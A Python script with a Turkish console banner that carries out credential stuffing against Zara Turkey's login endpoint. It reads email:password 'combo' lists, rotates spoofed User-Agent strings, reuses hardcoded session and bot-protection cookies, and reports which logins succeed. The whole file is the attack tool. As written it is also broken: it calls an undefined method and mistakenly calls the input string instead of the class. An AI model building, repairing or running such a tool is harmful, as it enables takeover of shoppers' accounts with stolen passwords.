import requests
import random
import os
from cfonts import render, say

class Rick:
    def __init__(self, rick):
        self.rick = rick
        self.url = "https://www.zara.com/tr/tr/session/login?ajax=true"
        self.headers = {
            "Content-Type": "application/json",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
            "User-Agent": self.rick_ua(),
            "Referer": "https://www.zara.com/tr/tr",
            "Origin": "https://www.zara.com"
        }
        self.cookies = {
            "bm_ss": "ab8e18ef4e",
            "bm_s": "YAAQZCETAvL5dMCRAQAAs2AdzALX+1HnlHdRwFQUs6uyV+4njeCXhGPbtWQD7cGLZoKyAU+uWiNwLUeRmkJ46F0iNa+g5NqlEbdcLVt/VxsLgKriXQvyKEfk8Vj6yyetk+oEMMnS72zZG/LVAGoD0hy/ZaZP5LZVlnyhn+hHZ1X6aicmo79PHXA0i8tYqxf2EqYHtngJ3cNJSR1Xlb2r0BG3SQxP9Pp81fcouMF3K8tW02x26W5pVHns/aKE64Q3kqgQGJXoEc/nQGmPzYPIDP5QhfuQAFwIEnIXxAlsCDQjYsYPxhdwzb8q/RzKFZDXWk8WTWoZBPLRd0+nwa9bbg7E/rPZ+TEt",
            "ITXSESSIONID": "4e7afd7491f8122ed8d435caedded7e2",
            "ITXDEVICEID": "1026f91bfa417449d6b5952398cb1eal",
            "UAITXID": "37330dea16e4e2bf21d866e29c3cce896d34f4e010d7c6ba8517201d173b9e43"
        }

    def rick_ua(self):
        versions = ["13.1.2", "13.1.1", "13.0.5", "12.1.2", "12.0.3"]
        oss = [
            "Macintosh; Intel Mac OS X 10_15_7",
            "Macintosh; Intel Mac OS X 10_14_6",
            "iPhone; CPU iPhone OS 14_0 like Mac OS X",
            "iPhone; CPU iPhone OS 13_6 like Mac OS X"
        ]
        version = random.choice(versions)
        platform = random.choice(oss)
        return f"Mozilla/5.0 ({platform}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version} Safari/605.1.15 Edg/122.0.0.0"
    def rick_combo(self):
        with open(self.rick, 'r') as file:
            combos = file.readlines()
        for combo in combos:
            email, password = combo.strip().split(':')
            payload = {"email": email, "password": password}
            self.headers["User-Agent"] = self.thomas_ua()  
            response = requests.post(self.url, headers=self.headers, cookies=self.cookies, json=payload)
            if response.status_code == 200:
                print(f"{email} {password} Başarılı ✅.")
            else:
                print(f"{email} {password}  [ Başarısız ❌ ] ")
rick = render('{   RICK     ZARA}', colors=['white', 'blue'], align='center')
print(f'''\n
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
     
                      {rick}
    
 
   ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛    
''')                
rick = input(" ~ Combo dosyası  girin: ")
rick = rick(rick)
rick.rick_combo()
